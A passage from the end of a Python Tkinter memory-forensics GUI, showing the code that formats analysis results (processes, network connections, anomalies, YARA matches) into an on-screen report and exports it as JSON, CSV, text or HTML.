        self.report_text.insert("end", f"Source: {report['metadata']['source']}\n")
        self.report_text.insert("end", f"MD5: {report['metadata']['file_hash']}\n\n")
        self.report_text.insert("end", f"THREAT SCORE: {report['threat_score']}/100\n\n")
        self.report_text.insert("end", "-" * 80 + "\n")
        self.report_text.insert("end", "PROCESS LIST\n")
        self.report_text.insert("end", "-" * 80 + "\n")
        for p in report["processes"]:
            flag = " [SUSPICIOUS]" if p.get("suspicious") else ""
            self.report_text.insert("end", f"  PID:{p['pid']:>6}  {p['name']:<25} {p['path']}{flag}\n")
        self.report_text.insert("end", "\n" + "-" * 80 + "\n")
        self.report_text.insert("end", "NETWORK CONNECTIONS\n")
        self.report_text.insert("end", "-" * 80 + "\n")
        for c in report["network_connections"]:
            self.report_text.insert("end", f"  {c['proto']:>4} {c['local_addr']}:{c['local_port']} -> {c['remote_addr']}:{c['remote_port']} [{c['state']}] ({c['process']})\n")
        self.report_text.insert("end", "\n" + "-" * 80 + "\n")
        self.report_text.insert("end", "ANOMALIES\n")
        self.report_text.insert("end", "-" * 80 + "\n")
        for a in report["anomalies"]:
            self.report_text.insert("end", f"  [{a['severity']}] {a['type']}: {a['description']}\n")
            self.report_text.insert("end", f"          Evidence: {a['evidence']}\n")
        self.report_text.insert("end", "\n" + "-" * 80 + "\n")
        self.report_text.insert("end", "YARA MATCHES\n")
        self.report_text.insert("end", "-" * 80 + "\n")
        for y in report["yara_matches"]:
            self.report_text.insert("end", f"  [{y['severity']}] {y['rule_name']} ({y['category']}): {y['match_count']} matches at {y['first_offset']}\n")
        self.status_var.set("Report generated")

    def _build_report_data(self):
        return {
            "metadata": {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "source": self.loaded_file or "Simulated Data",
                "file_hash": hashlib.md5(str(time.time()).encode()).hexdigest(),
                "tool": "Memory Forensics Analyzer"
            },
            "threat_score": self.threat_score,
            "processes": self.processes,
            "network_connections": self.network_conns,
            "modules": self.modules,
            "anomalies": self.anomalies,
            "yara_matches": self.yara_matches,
            "timeline": self.timeline_events
        }

    def _export(self, fmt):
        if not self.processes:
            messagebox.showwarning("No Data", "No data to export.")
            return
        report = self._build_report_data()
        ext_map = {"json": "json", "csv": "csv", "txt": "txt", "html": "html"}
        type_map = {"json": [("JSON files", "*.json")], "csv": [("CSV files", "*.csv")],
                     "txt": [("Text files", "*.txt")], "html": [("HTML files", "*.html")]}
        path = filedialog.asksaveasfilename(
            title=f"Export Report as {fmt.upper()}",
            defaultextension=f".{ext_map[fmt]}",
            filetypes=type_map[fmt]
        )
        if not path:
            return
        try:
            if fmt == "json":
                with open(path, "w", encoding="utf-8") as f:
                    json.dump(report, f, indent=2, default=str)
            elif fmt == "csv":
                with open(path, "w", newline="", encoding="utf-8") as f:
                    w = csv.writer(f)
                    w.writerow(["Type", "Severity", "Process", "Description", "Evidence"])
                    for a in report["anomalies"]:
                        w.writerow([a["type"], a["severity"], a["process"], a["description"], a["evidence"]])
                    w.writerow([])
                    w.writerow(["PID", "Name", "Path", "Memory KB", "Status", "Suspicious"])
                    for p in report["processes"]:
                        w.writerow([p["pid"], p["name"], p["path"], p["memory_kb"], p["status"], p.get("suspicious", False)])
            elif fmt == "txt":
                with open(path, "w", encoding="utf-8") as f:
                    f.write("MEMORY FORENSICS ANALYSIS REPORT\n")
                    f.write(f"Generated: {report['metadata']['timestamp']}\n")
                    f.write(f"Threat Score: {report['threat_score']}/100\n\n")
                    f.write("ANOMALIES:\n")
                    for a in report["anomalies"]:
                        f.write(f"  [{a['severity']}] {a['type']}: {a['description']}\n")
                    f.write("\nPROCESSES:\n")
                    for p in report["processes"]:
                        f.write(f"  PID:{p['pid']} {p['name']} {p['path']}\n")
            elif fmt == "html":
                with open(path, "w", encoding="utf-8") as f:
                    f.write("<!DOCTYPE html><html><head><title>Memory Forensics Report</title>")
                    f.write("<style>body{font-family:monospace;background:#0d1117;color:#e6edf3;padding:20px}")
                    f.write("h1{color:#58a6ff}h2{color:#3fb950}table{border-collapse:collapse;width:100%}")
                    f.write("th{background:#161b22;color:#58a6ff;padding:8px;text-align:left}")
                    f.write("td{padding:6px;border-bottom:1px solid #30363d}")
                    f.write(".high{color:#f85149}.medium{color:#d29922}.low{color:#3fb950}</style></head><body>")
                    f.write(f"<h1>Memory Forensics Report</h1>")
                    f.write(f"<p>Generated: {report['metadata']['timestamp']}</p>")
                    f.write(f"<p>Threat Score: <span class='high'>{report['threat_score']}/100</span></p>")
                    f.write("<h2>Anomalies</h2><table><tr><th>Type</th><th>Severity</th><th>Process</th><th>Description</th></tr>")
                    for a in report["anomalies"]:
                        sev_class = a["severity"].lower()
                        f.write(f"<tr><td>{a['type']}</td><td class='{sev_class}'>{a['severity']}</td><td>{a['process']}</td><td>{a['description']}</td></tr>")
                    f.write("</table><h2>Processes</h2><table><tr><th>PID</th><th>Name</th><th>Path</th><th>Status</th></tr>")
                    for p in report["processes"]:
                        cls = "high" if p.get("suspicious") else ""
                        f.write(f"<tr><td class='{cls}'>{p['pid']}</td><td class='{cls}'>{p['name']}</td><td>{p['path']}</td><td>{p['status']}</td></tr>")
                    f.write("</table></body></html>")
            self.status_var.set(f"Report exported as {path}")
            messagebox.showinfo("Export Complete", f"Report saved to:\n{path}")
        except Exception as e:
            messagebox.showerror("Export Error", str(e))

    def _clear_all(self):
        self.processes = []
        self.network_conns = []
        self.modules = []
        self.anomalies = []
        self.yara_matches = []
        self.timeline_events = []
        self.threat_score = 0
        self.loaded_file = None
        for tree in [self.proc_tree, self.net_tree, self.mod_tree, self.anom_tree, self.yara_tree, self.tl_tree]:
            for item in tree.get_children():
                tree.delete(item)
        self.report_text.delete("1.0", "end")
        self.threat_bar["value"] = 0
        self.proc_count_var.set("Processes: 0")
        self.proc_susp_var.set("Suspicious: 0")
        self.mod_count_var.set("Modules: 0 | Suspicious: 0")
        self.anom_count_var.set("Anomalies: 0")
        self.threat_var.set("Threat Score: 0/100")
        self.proc_detail_var.set("Select a process for details")
        self.status_var.set("Ready - No memory dump loaded")

    def _export_report(self):
        self._generate_report()

if __name__ == "__main__":
    root = tk.Tk()
    app = MemoryForensicsApp(root)
    root.mainloop()
